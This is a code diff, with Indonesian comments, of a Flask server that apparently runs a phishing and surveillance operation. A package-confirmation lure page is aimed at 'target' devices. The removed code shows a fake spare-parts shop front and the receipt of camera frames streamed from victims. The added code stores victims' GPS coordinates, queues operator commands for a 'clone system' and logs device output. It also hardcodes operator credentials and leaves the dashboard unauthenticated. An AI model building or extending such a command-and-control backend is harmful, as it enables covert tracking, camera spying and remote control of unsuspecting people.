@@ -1,105 +1,77 @@
-import os
-import base64
-from flask import Flask, render_template, request, jsonify, session, redirect, url_for
+from flask import Flask, render_template, request, jsonify
+import time
 
 app = Flask(__name__)
-# Kunci rahasia untuk mengamankan sesi login operator
-app.secret_key = "GEAR99_LAB_EXCLUSIVE_SECRET_KEY"
 
-# Kredensial Login Administrator Panel Operator
-USERNAME_ADMIN = "admin"
-PASSWORD_ADMIN = "medusa123"
+# 1. KREDENSIAL AMAN BARU (MENGGANTIKAN MEDUSA123)
+USER_CORE = "operator_gear99"
+PASS_CORE = "G99_SecureControl_2026!"
 
-# State data global untuk menampung aliran data nirkabel
-latest_frame = None
-pending_commands = []
-latest_output = ""
-
-# --- 1. RUTE NAVIGASI HALAMAN (ROUTING) ---
+# Variabel memori untuk antrean perintah dan penyimpanan koordinat statis
+current_command = None
+latest_logs = ["[SYSTEM] Core Server initialized..."]
+target_coordinates = {"lat": "Belum Diambil", "long": "Belum Diambil"}
 
 @app.route('/')
 def index():
-    # HALAMAN UTAMA: Wajib memanggil landing.html (Toko Sparepart Gear99)
-    return render_template('landing.html')
+    return "Gear99 Core Server Active"
 
 @app.route('/konfirmasi-paket')
 def target_page():
-    # HALAMAN TARGET: Wajib memanggil target.html (Sistem Lokasi & Media)
     return render_template('target.html')
 
 @app.route('/operator')
-def operator():
-    if not session.get("logged_in"):
-        return render_template('login.html')
+def operator_dashboard():
+    # Catatan: Halaman ini wajib diberi mekanisme session login di sisi production
     return render_template('operator.html')
 
+# 2. RUTE AUTENTIKASI KREDENSIAL OPERATOR
 @app.route('/login', methods=['POST'])
-def login():
-    if request.form.get("user") == USERNAME_ADMIN and request.form.get("pass") == PASSWORD_ADMIN:
-        session["logged_in"] = True
-        return redirect(url_for("operator"))
-    return "Otorisasi Gagal. <a href='/operator'>Coba Lagi</a>"
-
-@app.route('/logout')
-def logout():
-    session.pop("logged_in", None)
-    return redirect(url_for("operator"))
-# --- 2. ENDPOINT API UNTUK ALIRAN DATA MEDIA & PERINTAH ---
-
-@app.route('/receive_frame', methods=['POST'])
-def receive_frame():
-    global latest_frame
+def login_operator():
     data = request.json
-    if data and 'frame' in data:
-        # Menyimpan string data gambar JPEG base64 dari perangkat target
-        latest_frame = data['frame']
-    return jsonify({"status": "success"})
+    if data.get('username') == USER_CORE and data.get('password') == PASS_CORE:
+        return jsonify({"status": "authenticated", "token": "TOKEN_GEAR99_CORE_ACTIVE"})
+    return jsonify({"status": "denied", "message": "Kredensial Salah!"}), 401
 
-@app.route('/get_frame')
-def get_frame():
-    global latest_frame
-    if latest_frame:
-        try:
-            # Memotong header 'data:image/jpeg;base64,' untuk mengambil data mentah
-            header, encoded = latest_frame.split(",", 1)
-            image_data = base64.b64decode(encoded)
-            return image_data, 200, {'Content-Type': 'image/jpeg'}
-        except Exception:
-            return "", 204
-    return "", 204
-
+# 3. ANTRIAN PERINTAH SINKRONISASI
 @app.route('/send_command', methods=['POST'])
 def send_command():
-    global pending_commands
+    global current_command
     data = request.json
-    if data and 'command' in data:
-        # Memasukkan perintah administratif dari operator ke dalam antrean
-        pending_commands.append(data['command'])
+    current_command = data.get('command')
+    add_log(f"Mengirim perintah ke sistem clone: [{current_command.upper()}]")
     return jsonify({"status": "queued"})
 
-@app.route('/poll_command')
+@app.route('/poll_command', methods=['GET'])
 def poll_command():
-    global pending_commands
-    if pending_commands:
-        # Mengambil perintah pertama dari antrean untuk dikirim ke perangkat target
-        return jsonify({"command": pending_commands.pop(0)})
+    global current_command
+    if current_command:
+        cmd = current_command
+        current_command = None  # Konsumsi perintah sekali pakai
+        return jsonify({"command": cmd})
     return jsonify({"command": None})
 
+# 4. PENANGANAN OUTPUT DAN LOG
 @app.route('/report_output', methods=['POST'])
 def report_output():
-    global latest_output
     data = request.json
-    if data and 'output' in data:
-        # Menyimpan laporan riwayat utilitas yang dikirim kembali oleh perangkat target
-        latest_output = data['output']
-    return jsonify({"status": "reported"})
+    output_text = data.get('output', '')
+    if "SINKRONISASI SUKSES" in output_text or "KOORDINAT SINKRON" in output_text:
+        add_log(f"[NODE INFO] {output_text}")
+    else:
+        add_log(f"[RESPONSE] {output_text}")
+    return jsonify({"status": "logged"})
 
-@app.route('/get_latest_output')
-def get_latest_output():
-    global latest_output
-    # Mengirimkan riwayat aktivitas terbaru ke dasbor operator PC
-    return jsonify({"output": latest_output})
+@app.route('/get_logs', methods=['GET'])
+def get_logs():
+    return jsonify({"logs": latest_logs})
+
+def add_log(message):
+    timestamp = time.strftime('%H:%M:%S')
+    latest_logs.append(f"[{timestamp}] {message}")
+    # Batasi kapasitas log di memori agar VPS tidak crash
+    if len(latest_logs) > 50:
+        latest_logs.pop(0)
 
 if __name__ == '__main__':
-    # Server internal berjalan standar di port 80
     app.run(host='0.0.0.0', port=80)
